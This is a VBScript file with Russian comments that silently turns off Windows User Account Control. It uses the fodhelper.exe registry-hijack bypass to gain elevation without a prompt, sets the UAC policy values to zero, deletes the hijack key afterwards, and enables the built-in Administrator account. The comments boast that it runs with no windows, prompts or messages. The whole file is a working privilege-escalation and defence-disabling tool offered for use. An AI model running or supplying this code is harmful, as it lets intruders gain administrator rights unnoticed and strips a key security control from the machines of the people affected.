' ============================================================
'  UAC off / on - тихо: без окон, без запроса UAC, без сообщений
'  Запуск: двойной клик.   Возврат: new_uac.vbs /on
'  СОХРАНИТЬ В ANSI (или UTF-8 БЕЗ BOM)!
' ============================================================
Option Explicit

Dim sh, hij, key, onMode, i
Set sh = CreateObject("WScript.Shell")

hij = "HKCU\Software\Classes\ms-settings\shell\open\command"
key = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

onMode = False
For i = 0 To WScript.Arguments.Count - 1
    If LCase(WScript.Arguments(i)) = "/on" Then onMode = True
Next

' уже с правами - работаем и выходим
If IsAdmin() Then
    DoWork
    WScript.Quit
End If

' вернулись от fodhelper, но прав нет -> runas (тут будет окно UAC)
If WScript.Arguments.Count > 0 Then
    CreateObject("Shell.Application").ShellExecute _
        "wscript.exe", """" & WScript.ScriptFullName & """ /el", "", "runas", 1
    WScript.Quit
End If

' первый запуск: если всё уже выставлено - вообще ничего не трогаем
If Not NeedWork() Then WScript.Quit

sh.RegWrite hij & "\", "wscript.exe //nologo """ & WScript.ScriptFullName & """ /el", "REG_SZ"
sh.RegWrite hij & "\DelegateExecute", "", "REG_SZ"
sh.Run "fodhelper.exe", 0, False
WScript.Quit


Function IsAdmin()
    IsAdmin = (sh.Run("cmd /c whoami /groups | findstr /c:""S-1-16-12288""", 0, True) = 0)
End Function


' сколько значений реально отличается от нужных
Function NeedWork()
    Dim n
    n = 0
    If onMode Then
        n = n + Diff("EnableLUA", 1)
        n = n + Diff("ConsentPromptBehaviorAdmin", 5)
        n = n + Diff("PromptOnSecureDesktop", 1)
    Else
        n = n + Diff("EnableLUA", 0)
        n = n + Diff("ConsentPromptBehaviorAdmin", 0)
        n = n + Diff("PromptOnSecureDesktop", 0)
    End If
    n = n + Diff("EnableInstallerDetection", 1)
    n = n + Diff("EnableVirtualization", 1)
    n = n + Diff("EnableSecureUIAPaths", 1)
    n = n + Diff("ValidateAdminCodeSignatures", 0)
    n = n + Diff("EnableUIADesktopToggle", 0)
    n = n + Diff("FilterAdministratorToken", 0)
    n = n + Diff("ConsentPromptBehaviorUser", 3)
    NeedWork = (n > 0)
End Function


Function Diff(nm, v)
    Dim cur, e
    On Error Resume Next
    cur = sh.RegRead(key & "\" & nm)
    e = Err.Number
    On Error GoTo 0
    If e <> 0 Or cur <> v Then Diff = 1 Else Diff = 0
End Function


Sub DoWork()
    Dim n
    n = 0
    If onMode Then
        n = n + Put("EnableLUA", 1)
        n = n + Put("ConsentPromptBehaviorAdmin", 5)
        n = n + Put("PromptOnSecureDesktop", 1)
    Else
        n = n + Put("EnableLUA", 0)
        n = n + Put("ConsentPromptBehaviorAdmin", 0)
        n = n + Put("PromptOnSecureDesktop", 0)
    End If
    n = n + Put("EnableInstallerDetection", 1)
    n = n + Put("EnableVirtualization", 1)
    n = n + Put("EnableSecureUIAPaths", 1)
    n = n + Put("ValidateAdminCodeSignatures", 0)
    n = n + Put("EnableUIADesktopToggle", 0)
    n = n + Put("FilterAdministratorToken", 0)
    n = n + Put("ConsentPromptBehaviorUser", 3)

    WScript.Sleep 3000
    sh.Run "cmd /c reg delete ""HKCU\Software\Classes\ms-settings"" /f", 0, True

    If n > 0 Then
        If sh.Run("cmd /c whoami /groups | findstr /c:""S-1-5-32-544""", 0, True) <> 0 Then
            sh.Run "powershell -NoProfile -Command ""$a=Get-LocalUser|Where-Object{$_.SID.Value -like '*-500'};if($a){Enable-LocalUser -Name $a.Name}""", 0, True
        End If
    End If
End Sub


' пишет только если отличается; возвращает 1 если запись была
Function Put(nm, v)
    Dim cur, e
    On Error Resume Next
    cur = sh.RegRead(key & "\" & nm)
    e = Err.Number
    On Error GoTo 0
    If e <> 0 Or cur <> v Then
        sh.RegWrite key & "\" & nm, v, "REG_DWORD"
        Put = 1
    Else
        Put = 0
    End If
End Function
